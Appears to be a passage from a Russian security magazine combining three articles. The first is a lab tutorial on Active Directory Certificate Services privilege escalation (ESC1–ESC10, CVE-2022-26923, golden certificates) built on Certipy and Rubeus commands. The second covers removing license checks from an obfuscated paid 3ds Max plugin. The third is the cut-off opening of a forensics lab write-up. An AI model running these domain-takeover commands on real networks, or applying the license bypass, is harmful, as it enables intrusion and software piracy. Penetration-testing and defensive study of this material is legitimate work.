                       Запрос сертификата

Сертификаты включают в себя некоторые парамет ры. Вот наиболее интерес-
ные из них:
 • Subject — владелец сертификата;
 • SAN (SubjectAlternativeName) определяет одно или несколь ко аль тернатив-
   ных имен, которые может исполь зовать владелец (это нам пригодит ся
   в атаках);
 • Extended/Enhanced Key Usages — набор иден тификаторов, которые опре-
   деляют, как будет исполь зовать ся сертификат.

Сертификаты  выпускают ся  по  определен ным  шаблонам,  описывающим
парамет ры, с которы ми будет выпущен сертификат, например:
 • Кто может запрашивать сертификат по дан ному шаблону?
 • Кто может изменять шаблон?
 • Какие EKU (значения Extended Key Usage) будут определены?
 • На какой период будет выпущен сертификат?

Проще говоря, шаблоны сертификатов определяют порядок запроса и исполь -
зования сертификатов, выдан ных цен тром сертификации.


Â ÏÎÈÑÊÀÕ ÑÅÐÒÈÔÈÊÀÒÎÂ

Шаблоны сертификатов хранят ся в следующем кон тейнере:


CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=
Configuration,DC=contoso,DC= com

Соответствен но, получить шаблоны можно при помощи следующей коман ды
PowerShell, исполь зуя модуль AD:


PS > Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public
Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com"
-Filter * -Properties *

Так же в Windows есть предустановленный инстру мент certutil, который
может вывести все шаблоны для сертификатов в более удобном и под робном
виде.


$ certutil -v -template





                     Вы вод certutil.exe

Инстру мент Certipy позволит сделать это с Linux и сразу выг рузить дан ные,
которые можно заг рузить в BloodHound.


$ certipy find 'contoso/john:Passw0rd@contoso.com'





                  Шаблоны в BloodHound

Чтобы  выпустить  сертификат,  нужно,  чтобы наш  поль зователь  состоял
в домен ной группе, у которой есть права на выпуск этого сертификата.
Еще необходима возможность аутен тифицировать ся в домене. В совокупности
эти два требования дадут мак сималь ный импакт для атакующего.
  Значения поля EKU, позволяющие аутен тифицировать ся в домене:
 • Client Authentication (1.3.6.1.5.5.7.3.2 );
 • PKINIT Client Authentication (1.3.6.1.5.2.3.4 );
 • Smart Card Logon (1.3.6.1.4.1.311.20.2.2 );
 • Any Purpose EKU (2.5.29.37.0 );
 • SubCA (- ).



                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                     ПОВЫШАЕМ ПРИВИЛЕГИИ
                           ЧЕРЕЗ ACTIVE DIRECTORY
                              CERTIFICATION SERVICES





ÀÒÀÊÈ ÍÀ AD CS

Ëàáîðàòîðèÿ
Для проведения тестов нам пот ребу ется лабораторный стенд, состоящий
из двух виртуаль ных машин: Windows Server 2016 и Kali Linux. Перечислим
общие требования для всех атак:
 • сертификат может выпускать ся группой, в которую входит ваш поль -
   зователь;
 • Manager Approval должен быть отключен;
 • под пись CSR не требует ся.

Последние два требования выполняют ся в Windows Server по умолчанию, и на
них можно не обращать внимания (привет, админы!). Еще нам пот ребу ется
возможность  аутен тификации  в  домене  с  выпущен ным  сертификатом.
На нашем лабораторном стен де мы будем исполь зовать поль зователя Kent.
Jill:P@ssw0rd.


Ñáîð èíôîðìàöèè
Сбор информации о цели — первый этап тестирования на проник новение.
Для сбора информации и  визу ализации можно исполь зовать  Certipy +
BloodHound. Перед этим нужно заг рузить под готовленные разработ чиками
Certipy запросы на свой хост.


wget -O ~/.config/bloodhound/customqueries.json https://raw.
githubusercontent.com/ly4k/Certipy/main/customqueries.json

Получить информацию из цен тра сертификации позволяет модуль find:


$ certipy find 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com

BloodHound дает возможность визу ализировать информацию по объектам AD
CS и правам на них, а так же определить век торы повышения привилегий.





                      Запросы в BloodHound





                      Запросы в BloodHound


Modifiable SAN. ESC1
Эта атака основывается на изменении сертификата SAN — цифрового сер-
тификата безопасности, который позволяет защищать несколь ко имен хостов
одним сертификатом. Это позволит нам выпустить сертификат на дру гого
поль зователя, даже администратора домена. Чтобы атака прош ла успешно,
шаблон    сертификата    должен    иметь     установленный    флаг
ENROLLEE_SUPPLIES_SUBJECT.
  Вы ведем все такие шаблоны с исполь зованием BloodHound.





                  Вы вод ESC1 в BloodHound

Если у нас есть такой шаблон, то мы в шаге от получения учет ной записи адми-
нистратора домена. Запросить сертификат на любого поль зователя можно
следующим образом:


$ certipy req 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com
-dc-ip 10.11.1.184 -ca CA-contoso -template "1" -alt
"administrator@contoso.com"

В этой коман де устанавливается параметр alt, который указывает SAN в зап-
рашиваемом сертификате.
  Из лога Certipy вид но, что мы получили сертификат на поль зователя
Administrator.





             Получение сертификата на администратора

Теперь все, что нам остается, — это пройти аутен тификацию с выпущен ным
сертификатом и получить NTLM-хеш администратора домена.





                  Авторизация под администратором

В Windows мы можем это сделать при помощи mmc, исполь зуя оснастку
Certificates. При попыт ке выпустить сертификат от нас пот ребу ется допол-
нитель ная информация, в которой мы и укажем любого поль зователя.
  В Subject Name выбираем Type: Common name, а в Alternative name —
User principal name: administrator@contoso.com.





                Вы пуск сертификата через MMC

Если все прош ло успешно, нужно экспортировать сертификат с указанием
пароля и запросить TGT-билет для поль зователя:


PS > Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:
"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:
"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /ptt

Для перевода сертификата в Base64 можно исполь зовать следующие коман -
ды:


PS > $file = get-content 'C:\Users\Kent.Jill\Desktop\1.pfx'
-Encoding Byte


PS > [System.Convert]::ToBase64String($fileContentBytes) |
Out-File 'D:\pfx-bytes.txt'


Any or None Purpose Attack. ESC2
Если в шаблоне сертификата указан EKU любого назначения или вообще
отсутству ет EKU, сертификат можно исполь зовать для чего угод но. Им можно
злоупот реблять, как ESC3, например исполь зовать сертификат в качестве тре-
бования для запроса дру гого сертификата от имени любого поль зователя.


Enrollment Agent. ESC3
В докумен тации Microsoft указано, что EKU Certicate Request Agent может
исполь зовать ся, чтобы выдать себя за дру гого поль зователя, и позволяет
выпустить сертификат, который может быть исполь зован для совместной под -
писи запросов от имени любого поль зователя для любого шаблона.


$ certipy req 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com
-ca CA-contoso -template Agent





                        Запрос через агент

После того как мы получили обычного поль зователя, запросим сертификат,
пред ставившись дру гим поль зователем.


$ certipy req 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com
-ca CA-contoso -template User -on-behalf-of 'contoso\
Administrator' -pfx kent.jill.pfx





           Запрос сертификата от имени дру гого поль зователя


Certificate ACL Abuse. ESC4
Простая атака, основан ная на правах поль зователя, применяющихся к шаблону
сертификата. Если мы ском прометировали поль зователя, который имеет права
на запись в шаблоны, то можем провести атаку ESC1 и повысить свои при-
вилегии.
  При помощи инстру мен та PowerView мы можем красиво вывести все ACE
на шаблоны:


PS > Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,
CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,
DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)"
-ResolveGUIDs|Foreach-Object {$_ | Add-Member -NotePropertyName
Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier
.value) -Force; $_}

Од нако BloodHound покажет то же самое еще удобнее и красивее. Можно уви-
деть, что группа с SID = 513 (Domain Users) имеет права GenericAll на шаблон
ACL. Подобное неред ко встречает ся в «живой природе», поэтому не стоит счи-
тать этот пример полностью искусствен ным.





               Вы вод прав на шаблон в BloodHound

Следующим действием будет сохранение текущего состояния сертификата,
чтобы вернуть его в исходное состояние после эксплу атации (мы ведь этичные
хакеры). Заод но мы изменим кон фигурацию под атаку ESC1.
   Для выполнения этих действий certipy имеет специаль ный флаг -save-
old:


$ certipy template 'contoso.com/Administrator:P@ssw0rd'@DC01.
contoso.com -template ACL -save-old





                   Сохранение исходного шаблона

Теперь шаблон уязвим к ESC1 и мы можем получить сертификат на админис-
тратора домена.


$ certipy req 'contoso.com/Administrator:P@ssw0rd'@DC01.contoso.
com -template acl -ca CA-contoso -alt administrator@contoso.com





                   Запрос сертификата на админа


Everything and for everyone (EDITF_ATTRIBUTESUBJECTALTNAME2).
ESC6
Атаку ESC5 мы разбирать не будем, так как она нацелена не на AD CS, а на
объекты, которые могут принести какой-то импакт в AD CS. А вот ESC6 —
это самая опасная и по своей сути лег кая атака. Если системный администра-
тор     (видимо,     не     в     своем     уме)     установил     флаг
EDITF_ATTRIBUTESUBJECTALTNAME2 в цен тре сертификации, то это простей-
ший век тор для повышения привилегий в системе.
   Этот флаг позволяет хакеру указать произволь ный SAN (Subject Alternative
Name) для всех сертификатов, несмотря на кон фигурацию шаблона сер-
тификата.


$ certipy req 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com
-template <Любой шаблон> -ca CA-contoso -alt
administrator@contoso.com


Manage CA & Manage Certificate. ESC7
В AD CS есть шаблон, который по умолчанию уязвим к ESC1, — SubCA,
но выпускать его могут лишь поль зователи, входящие в группу Domain Admins.
  ESC7 основан на том фак те, что запросы, которые завершились неудачей,
сохраняются и могут быть запрошены еще раз. Поль зователи, имеющие права
Manage CA и Manage Certificates на центр сертификации, могут перевы пол-
нять неудачные запросы на выпуск сертификата и выпускать SubCA на любого
поль зователя.


$ certipy req 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com
-template SubCA -ca CA-contoso -alt administrator@contoso.com





                 Вы полняем неудачный запрос

Сохранив ID запроса и приват ный ключ, выпустим сертификат:


$ certipy ca 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com -ca
 CA-contoso -issue-request 32





            Вы пуск сертификата из неудачного запроса

Теперь запросим перевы пущен ный сертификат.


$ certipy req 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.contoso.com
-ca CA-contoso -retrieve 32





                Получение администратора домена

В очеред ной раз мы стали администратором домена.


Relay íà AD CS Web Enrollment. ESC8
Ты наверняка слы шал про PetitPotam или читал замечатель ные статьи @Delyura
«Захват кон троллера домена с помощью атаки PetitPotam» и @Dirkjanm «NTLM
relaying to AD CS — On certicates, printers and a little hippo», которые под робно
описывают дан ную атаку.
   Если крат ко, то мы можем релеить хеш в центр сертификации, получая сер-
тификат в формате PKCS12 на поль зователя, чей хеш мы рет ран слировали.




                      От личный  доклад  про  Relay-ата ки:  Coercions
                      and Relays — The First Cred is the Deepest with
                           Gabriel Prud’homme



dNSHostName Spoofing
В мае 2022 года в Active Directory была найдена уязвимость, которой был
присвоен иден тификатор CVE-2022-26923. Ког да поль зователь запрашивает
сертификат на основе шаблона Users, UPN (UserPrincipalName) учет ной записи
поль зователя вставляет ся в параметр SAN (Subject  Alternative Name) сер-
тификата.
  Од нако учет ные записи компь ютеров не имеют UPN, вместо этого исполь -
зует ся dNSHostName компь ютера, который и вставляет ся в параметр SAN.
В этом и зак лючается суть атаки: изменив dNSHostName на кон троллер домена,
мы выпустим сертификат на машин ную учет ную запись этого кон троллера.
  По  умолчанию  обычные  поль зователи  могут  добавлять  компь ютеры
в домен, и учет ная запись компь ютера будет иметь такую интересную при-
вилегию, как Validate write to DNS host name, что позволяет изменять
параметр dNSHostName на произволь ную строку. Соот ветствен но, мы можем
поменять dNSHostName на DNS-имя кон троллера домена, а затем аутен -
тифицировать ся, получив сертификат на машин ную учет ную запись кон трол-
лера домена! Однако не все так просто. Ког да мы меняем dNSHostName
на компь ютере, меняются значения servicePrincipalName, а они должны
быть уникаль ными.
   Вот тут в игру всту пает еще одна интересная привилегия на объект компь -
ютера — Validate write to Service Principal Name (SPN), позволяющая
изменять, добавлять и удалять параметр SPN и обойти ограничение уникаль -
ности, просто удалив SPN, где указывается полный dNSHostName, а не
sAMAccountName компь ютера.
   Таким образом, возможность создания нового компь ютера и привилегии
на компь ютер по умолчанию дают злоумыш леннику век тор для повышения
привилегий в системе.
  Полный флоу атаки выг лядит следующим образом:
 1. Создание компь ютера в домене с dNSHostName , соот ветству ющим DNS-
  имени кон троллера домена.
 2. Замена SPN.
 3. Запрос сертификата для компь ютера.

Создадим компь ютер через Certipy, указав в параметр -dns FQDN кон трол-
лера домена:


$ certipy account create 'contoso.com/Kent.Jill:P@ssw0rd'@DC01.
contoso.com -user pwned -dns DC01.contoso.com





                   Создание компь ютерной учет ки

Запрашиваем сертификат, исполь зуя стан дартный шаблон Machine.





            Вы пуск сертификата на кон троллер домена

Обрати внимание: мы выпустили сертификат на машин ную учет ку кон троллера
домена, после чего стали этим кон троллером.
  В тематических чатах я замечал следующий вопрос: а как проверить, уязвим
ли кон троллер домена к CVE-2022-26923? Главным признаком уязвимости
слу жит наличие SID в ответе на запрос сертификата. Если он есть — патч в сис-
теме присутству ет, если нет, то пат ча тоже нет.


Golden Certificate
Это простой аналог для Golden или Diamond Ticket.
  Первый этап атаки — создание бэкапа цен тра сертификации и получение
сертификата этого цен тра.


$ certipy ca 'contoso.com/Administrator:P@ssw0rd'@DC01.contoso.
com -ca CA-contoso -backup





           Делаем резервную копию цен тра сертификации

С помощью получен ного сертификата мы можем запрашивать сертификаты
на любого поль зователя.


$ certipy forge -ca-pfx CA-contoso.pfx -alt administrator@contoso.
com





            Вы пуск сертификата на любого поль зователя


ÑÎÏÎÑÒÀÂËÅÍÈÅ ÑÅÐÒÈÔÈÊÀÒÎÂ

В  пат че  CVE-2022-26923  в  реестр  были  добавлены  два  значения:
StrongCertificateBindingEnforcement  и  CertificateMappingMethods,
пред назначен ные для сопоставления сертификатов.


StrongCertificateBindingEnforcement. Kerberos
После            появления            исправлений           параметр
StrongCertificateBindingEnforcement по умолчанию имеет значение 1.
Теперь KDC проверяет, выполняет ся ли явное сопоставление сертификатов.
Если да, то аутен тификация разрешена. В противном слу чае KDC проверит,
имеет ли сертификат SID, и под твердит его. Если SID отсутству ет, аутен -
тификация разрешена.
  Значение 0 не означает никаких действий, что оставляет век тор атаки
откры тым.
   Если параметр имеет значение 2, KDC проверяет, выполняет ся ли надеж-
ное сопоставление сертификатов. Если да, то аутен тификация разрешена.
В противном слу чае KDC проверит, имеет ли сертификат SID, и под твердит
его. Если этот SID отсутству ет, аутен тификация отклоняет ся.
  Значение 2 будет установлено по умолчанию с 9 мая 2023 года.


CertificateMappingMethods. Schannel
В дан ном методе исполь зует ся аутен тификация через протокол Schannel. Этот
протокол   сопоставляет   сертификаты   нем ного   иначе.   Параметр
CertificateMappingMethods может принимать пять значений:
 • 0x0001 — сопоставление сертификатов субъект/объект;
 • 0x0002 — сопоставление сертификатов ЦА;
 • 0x0004 — сопоставление сертификатов по SAN;
 • 0x0008 — сопоставление сертификатов S4U2Self;
 • 0x0010 — явное сопоставление сертификатов S4U2Self.

По умолчанию установлено значение 0x18 (0x8 и 0x10). S4U2Self исполь зует ся
из-за того, что Schannel не под держивает новые парамет ры, которые привнес
очеред ной патч, и сопоставление идет через Kerberos.




                     Под робно  прочитать  про  сопос тавление  сер-
                      тифика тов мож но в недавней статье Oliver Lyak
                            « Certipy 4.0: ESC9 & ESC10, BloodHound GUI, New
                          Authentication and Request Methods — and more!».



ESC9. Jump to DA
Для        этой        атаки       нужно,        чтобы       параметр
StrongCertificateBindingEnforcement имел значение 1 или 0. Еще пот -
ребу ется       сертификат       с        установленным       флагом
CT_FLAG_NO_SECURITY_EXTENSION  в  парамет ре  msPKI-Enrollment-Flag,
а так же GenericWrite любого поль зователя в домене. BloodHound 4.2.0 имеет
встроенные запросы для вывода подобных шаблонов.
  Первым делом следует получить хеш учет ной записи B от учет ной записи A,
которая имеет GenericWrite на B, например через Shadow Credentials:


$ certipy shadow auto 'contoso.com/Kent.Jill:P@ssw0rd' -account
Max

После получения хеша нужно изменить UPN учет ной записи B на UPN адми-
нистратора:


$ certipy account update 'contoso.com/Kent.Jill:P@ssw0rd' -user
Max -upn Administrator

Заметь, не на Administrator@contoso.com, а на Administrator.
   Даль ше запросим сертификат от учет ной записи Max (она же учет ная запись
B), хеш которой мы получили на первом этапе:


$ certipy req 'contoso.com/Max' -template new -ca CA-contoso
-hashes 275b741dead6da7aaa8ec5292db5abca

Посколь ку мы изменили UPN на Administrator, сертификат будет выпущен
на имя админа. Чтобы вернуть все как было, мы устанавливаем UPN обратно,
но уже с указанием домена:


$ certipy account update 'contoso.com/Kent.Jill:P@ssw0rd' -user
Max -upn Max@contoso.com


ESC10. Nameless accounts
Для успешного выполнения этой атаки нужно, чтобы парамет ры имели сле-
дующие значения:


CertificateMappingMethods: 0x4
StrongCertificateBindingEnforcement: 0

Так же нам понадобит ся разрешение GenericWrite на учет ную запись А.
  Дан ная атака пред полагает ком прометацию учет ных записей, у которых
отсутству ет UPN. К  таковым  относит ся,  в  частности, машин ная  учет ка
или встроенная учет ка Administrator.
  Сначала мы получаем хеш учет ной записи B, так же через ShadowCredentials
или любым дру гим способом:


$ certipy shadow auto 'contoso.com/Kent.Jill:P@ssw0rd' -account
Max

Затем меняем UPN учет ной записи на, например, кон троллер домена:


$ certipy account update 'contoso.com/Kent.Jill:P@ssw0rd' -user
Max -upn 'DC01$@contoso.com'

Далее запрашиваем сертификат от Max и... сами становим ся кон троллером
домена:


$ certipy req 'contoso.com/Max' -template new -ca CA-contoso
-hashes 275b741dead6da7aaa8ec5292db5abca


ÂÛÂÎÄÛ

Мы рассмот рели несколь ко видов атак на Active Directory Certication Services
и выяснили, каким образом с исполь зованием этой роли можно повысить при-
вилегии в системе. Защитить ся от таких атак относитель но несложно: нужны
правиль ные настройки сервера и, конечно же, не следует забывать о своевре-
мен ной установке обновлений безопасности.
   Для защиты требует ся всего лишь коррек тная настройка прав поль зовате-
лей на шаблоны, с отключением всех нестандартных настроек. Имен но некор-
рек тная  настройка шаблонов  приводит  к  атакам,  позволяющим  хакеру
повысить привилегии в две коман ды. Проверку коррек тности настроек шаб-
лонов можно выполнить с помощью замечатель ного инстру мен та PSPKIAudit .





                      Ес ли ты хочешь максимально защититься от атак
                        через AD CS, рекомендую изу чить большой гайд
                         от  Microsoft, который опи сыва ет  все аспекты
                      защиты, начиная от пла нирования архи тектуры
                      и  заканчивая мониторингом и  реаги рова ниям
                       на инци денты: Securing PKI .
ВЗЛОМ





Ком мерческие  пла гины  к  популяр ным
прог раммам, как и обыч ные при ложения,
используют   собствен ные   механиз мы
безопасности.  Сегод ня  мы  нем ного
поковы ряем ся во внут ренностях плат ных            МВК
расширений для популяр ного трехмерно -
го редак тора 3ds Max и узна ем, какие
методы защиты при меня ют их раз работ -
чики.




                       Статья имеет озна коми тельный характер и пред -
                       назна чена для специалис тов по безопас ности,
                       проводя щих тес тирова ние в рамках контракта.
                       Автор и  редакция  не  несут  ответс твенности
                        за любой  вред, при чиненный  с при менением
                       изложенной информа ции. Рас простра нение вре-
                      донос ных прог рамм, нарушение работы сис тем
                      и  нарушение  тай ны  перепис ки  прес леду ются
                      по закону.


В своих публикациях я уже неод нократ но зат рагивал тему реверса и де-
обфускации .NET-приложений и библиотек. Сегод ня поговорим о том же,
толь ко в несколь ко ином ключе. Начнем, в лучших традициях поручика Ржев-
ского, издалека.
   У  дизайнеров,  активно  занимающихся 3D-моделированием,  боль шой
популярностью  поль зует ся  редак тор 3ds Max небезызвестной ком пании
Autodesk. Этот профессиональ ный редак тор уже боль ше трид цати лет считает -
ся лидером отрасли, начиная еще с эпохи DOS. Разумеется, как любой про-
фессиональ ный редак тор, он предоставляет API, на основе которого толковый
поль зователь может дописы вать свои модули под собствен ные технические
задачи (скрипты, плагины и прочее). И конечно же, на рын ке прог рам много
обеспечения доволь но быстро появилась соот ветству ющая ниша, связан ная
с изготовлением и продажей подобного рода расширений, которые поль зуют -
ся спросом у профессиональ ных дизайнеров-трехмерщиков.
  За трид цать с лиш ним лет Autodesk успела наплодить множество типов
расширений, из которых самый старый и часто исполь зуемый — скриптинг
на MAXScript. MAXScript — собствен ный, ни на что не похожий (хотя Википедия
почему-то отмечает сходство с BASIC и LISP) язык, имеющий просто чудовищ-
ный по современ ным меркам син таксис. По сути, это тяжелое наследие лихих
девяностых, ког да гордыня первопроход цев компь ютерного софта заставляла
их изгалять ся во имя уникаль ности, лишь бы не как у всех. Самые отморожен -
ные из подобных решений отмерли, заместились общеприняты ми технологи-
ями (Python, JavaScript), дру гие сами стали неким стан дартом, предоставив
в качестве ком промисса интерфейс для вызова более популярных плат форм.
   Хотя в Autodesk и пред приняли робкую попыт ку заменить MAXScript
Python’ом, но на дан ный момент, похоже, MAXScript все-таки лидиру ет — дело
и в под держке старых наработок, и в том, что из MAXScript есть возможность
вызывать .NET-библиотеки, в которых можно реализовать любую хотелку.
   Вот так мы и подош ли к формулировке задачи исследования. Есть некая
линейка широко известных в узких кру гах лицен зирован ных продук тов, реали-
зован ных с помощью MAXScript. Если лицен зии нет, при заг рузке плагин выда-
ет такое красивое окош ко.





                    Нужна активация лицен зии!

И без регистрации расширение  отказывается  что-либо  делать  даль ше.
Как оту чить прог рамму от этой вред ной привычки?
  Поначалу нам слег ка везет: расширение имеет формат простого тек стового
скрипта, в котором хоть и напрочь отсутству ют форматирование, пробелы
и переводы строк, но логику проследить можно. К слову, мог ло быть и хуже —
это мог бы быть нативный плагин, да и сами скрипты бывают не толь ко проз-
рачного тек стового .MS-формата, но и зашифрован ными (.MSE) и даже
запакован ными (.MZP).
   Возни с ними боль ше, но останавливать ся на таких плагинах под робно мы
не будем, посколь ку и с откры тым тек стовым .MS-форматом проблем нам хва-
тит на целую статью.
  От крыв текст скрипта в блок ноте, мы видим, что он на девяносто процен тов
состоит из хаотичного набора латин ских сим волов и цифр, напоминающих
Base64 или упомяну тый мной в од ной из предыду щих статей адобовский
JSXBIN.





                    Содержимое плагина

Мысленно взяв в руки брит ву Оккама, пред положим, что это все-таки простей-
ший Base64. Это пред положение под тверждает и найден ная в откры той тек -
стовой части кода конструк ция на «мак совском» птичь ем язы ке:


...last_dll_id!=astrid or :: last_dll_fullname!= sett_dll.
fullname then( fn abytes=(dotnetclass"System.Convert").
frombase64string( fb64 ( astr ()));::sett_dll=dn_assembly.load(abytes
()); ...

В примерном переводе на понят ный человеческий язык это означает, что
некая Base64-строка по мере исполнения кон вертирует ся в бинарный массив,
который заг ружается как .NET-библиотека.
   Пог ружать ся в дебри этого стран ного язы ка в наши планы не входит, мы
ориентируем ся на конструк ции типа sett_dll.createinstance(...), заг -
ружающие объекты и фун кции из этой библиотеки. Слег ка поковы рявшись
с последу ющим кодом, начинаем потихонь ку приходить в уны ние, посколь ку
отту да импортирует ся до фига чего разного. А значит, с треском провалилась
изначаль ная догад ка, что разработ чики так извращен но засуну ли в текст скрип-
та дот нетовскую библиотеку исключитель но для проверки лицен зии (и мы лег -
ко откру тим проверку вместе со всей библиотекой).
  Но самый серь езный удар нас ожидает позднее, ког да мы, отыскав в коде
начало и конец страш ных строковых кон стант (а их там, оказывается две:
astr — более длин ная — и astrid), пробуем раскодировать их стан дартным
декодировщиком Base64. Начнем с самой длин ной строки astr, содержимое
которой до боли похоже на закодирован ный DLL. Оно раскодиру ется успешно,
и резуль тат вроде бы и вправду похож на DLL.





                   Содержимое строки astr

Похож-то он, конечно, похож, но как примерно тот леген дарный мотор,
который был похож на настоящий, но не работал. Сиг натура правиль ная, стро-
ки частично тоже вид ны, однако это явно неправиль ная расшифровка. Придет -
ся все-таки снова нырять в глу бины недоязы ка MAXScript. Вниматель но пос-
мотрев на процитирован ную выше строку кода, мы обнаруживаем между astr
и frombase64string незамет ную прок ладку — фун кцию fb64, после чего
находим ее код:


fb64 a b:"axpuger"c:"*"=(for i=1 to b.count do a=substitutestring(
substitutestring(substitutestring a(toupper b[i])c)(tolower b[i])(
toupper b[i]))c(tolower b[i]);a);fn

Фун кции toupper и tolower понят ны и без справочника — это, соот ветствен -
но, верхний и нижний регистр сим вола. Конструк ция же substitutestring a
b c эквивален тна полной замене в строке с всех подстрок (выберем для прос-
тоты JavaScript). Эту конструк цию можно пред ставить в виде a.replace(new
RegExp(b, 'g'), c). То есть этот замысловатый код на самом деле пред -
ставляет собой серию из вложен ных под становок со сменой регистра сим -
волов из строки axpuger через промежу точный сим вол *. На том же JavaScript
эта операция эквивален тна следующей фун кции, которой мы и перекодиру ем
строку до нормаль ного Base64:


function fb64(a)
{
  var b="axpuger";
  for (var i=0;i<b.length;i++)
  {
    b1=b.substring(i,1);
    a1=a.replace(new RegExp(b1.toUpperCase(), 'g'),"*");
    a2=a1.replace(new RegExp(b1.toLowerCase(), 'g'), b1.
toUpperCase());
    a=a2.replace(/\*/g, b1);
  }
  return a;
}

Как видишь, при ближайшем рассмот рении операция оказалась простой
и даже самообратимой, как всем известный XOR. Ины ми словами, чтобы
обратно закодировать для вставки в скрипт исправленную Base64-строку, нам
надо применить к ней ту же самую фун кцию.
  Вообще говоря, для людей, хорошо знакомых с MAXScript и 3ds Max, этот
этап не пред ставляет никакой проблемы — вовсе не обязатель но разбирать
алгоритм перекодировки, саму операцию можно было выполнить, не выходя
из 3ds Max, чуть под правив исходный скрипт. В общем-то, и обратная опе-
рация перекодировки исправленного модуля не обязатель на — ведь достаточ-
но просто убрать лиш нее звено fb64 в технологической цепочке.
  Од нако мы под ходим к следующему серь езному этапу работы: у нас уже
есть расшифрован ная дот нетовская библиотека, которую надо поправить
и закодировать обратно в скрипт. И здесь не все так глад ко — при заг рузке
библиотеки в dnSpy оказывается, что боль шинство методов имеют безум ные
имена, а их тела пусты. То есть модуль сурово обфусцирован.
  C подобным мы уже сталкивались в статье про .NET Reactor. Попытаемся
иден тифицировать и по возможности снять обфускатор при помощи de4dot.
Этот инстру мент выдает огромное множество ошибок, деобфусцировать нап-
рочь отказывается, однако поль за от него есть: он выдал имя обфускатора —
это Confuser.
   Слег ка погуг лив, мы обнаруживаем, что наш слу чай широко известен
и небезнадежен: добрые люди создали для него специализирован ный де-
обфускатор, причем даже с откры тым кодом . Решение прак тически однокли-
ковое — у деобфускатора всего две опции: -d (динамическая) и -s (статичес-
кая) распаковка. Динамическая распаковка на нашем модуле с диким визгом
и простыней логов валит ся, однако статическая создает модуль, хоть и не
до кон ца читабель ный в dnSpy, но вполне себе с откры тым кодом. Можно его
нормаль но анализировать даже без запуска и найти место для фак тически
однобайтового пат ча.





          Деобфусцирован ный модуль можно изу чить в dnSpy

А  вот  даль ше  у  нас  снова  возникают  проблемы:  перекодирован ный
в Base64 и заг ружен ный в скрипт исправленный модуль работать категоричес-
ки отказывается. 3ds Max при его заг рузке выдает ошибку "Error in DLL --

Runtime  error:  .NET  runtime  exception:  Could  not  load  type
'Invalid_Token.0x02000000...". Впрочем, такую же ошибку выдает и не
пат ченный, а просто деобфусцирован ный при помощи ConfuserEx-Unpacker
модуль — проблема явно в кривой деобфускации.
  Это значит, что наши мучения еще не закон чены и надо ломать голову
в поисках способа внести найден ный патч без деобфускации всей библиотеки,
как мы это делали в статье про.NET Reactor. Посколь ку наше повествование
и так уже достаточно затяну лось, честно признаюсь, что я таки нашел версию
деобфускатора  Confuser,  коррек тно обрабаты вающую  этот динамический
модуль и в статическом, и в динамическом режимах. Впоследствии деоб-
фусцирован ный и пат ченный модуль нормаль но работает из злополучного
скрипта. Если читателя не пугает арабская вязь, то вот ссылка на упомяну тую
версию ConfuserEx Unpacker.
  В зак лючение я все-таки в двух словах опишу направление для самос-
тоятель ного пат ча в обфусцирован ном модуле Confuser. На тот слу чай, если
тебе попадет ся версия, которая окажет ся не по зубам всем найден ным
в интернете деобфускаторам.
  В целом этот способ полностью аналогичен вариан ту с .NET Reactor, раз-
ница в том, что в Reactorе алгорит мом шифрования был обычный XOR. Соот -
ветствен но, можно пропат чить найден ный фраг мент  кода,  отксорив его
с существу ющим значением. В Confuser все совсем по-дру гому: покопавшись
в коде проекта ConfuserEx Unpacker, в модуле Protection/AntiTamper.cs
можно найти процеду ру DecryptMethods, где находит ся такой алгоритм:


for (uint i = 0; i < num; i++)
{
  uint num4 = reader.ReadUInt32();
  numArray[i] = num4 ^ arrayKeys[(int)((IntPtr)(i & 15))];
  arrayKeys[(int)((IntPtr)(i & 15))] = num4 + 0x3dbb2819;
}

Исходя из этого алгорит ма нель зя просто так взять и поменять один байт
в коде, посколь ку изменение одного байта влечет за собой повторное шиф-
рование всей последу ющей части блока. Тем не менее труд ности не помеха
для усид чивого хакера, которому, конечно, не составит тру да написать малень -
кую прог рам мку для пат ча и повторного шифрования блока дан ных на основе
приведен ного выше алгорит ма.
ВЗЛОМ





ИССЛЕДУЕМ ДАМПЫ
И ИЩЕМ СЛЕДЫ ВЗЛОМА
В СИСТЕМЕ





Сегод ня я расска жу, как извлекать дан ные
из таблицы MFT, получать информа цию
из фай лов Prefetch и монито ра исполь-
зования  системных  ресур сов   (srum),
а еще — ана лизи ровать фай лы логов опе-            rayhunt454                                                                                    grigadan454@gmail.com
раци онной системы. При исследова нии
обра за  оператив ной  памяти мы  поз -
накомим ся  с  внут ренним  устрой ством
памяти Windows и най дем артефак ты, сви -
детельству ющие о ком про мета ции сис-
темы.


Расследование киберин циден тов — это очень увлекатель ное занятие, тре-
бующее определен ных знаний и навыков. Отточить их помогают специаль ные
лабораторные работы, имитиру ющие реаль ные слу чаи успешных атак зло-
умыш ленников и взлома, с которы ми встречают ся на прак тике специалисты
по информацион ной безопасности. Сегод ня мы разберем лабораторную
работу Pwned-DC с ресурса CyberDefenders.
   По сценарию лабораторной работы произошел взлом Active Directory, зло-
умыш ленники смог ли захватить корпоративный кон троллер домена. Наша
задача — провести расследование инциден та и узнать, как хакерам удалось
проник нуть в сеть. Для исследования у нас имеется побитовая копия сис-
темного диска ском прометирован ной машины, оперативной памяти, а так же
информация об объектах домена.
   Заг рузим файл образов и начнем их исследовать.
   По резуль татам разбора этой лабораторной необходимо ответить на ряд
вопросов, но я покажу толь ко само решение и не буду озву чивать ответы. Тебе
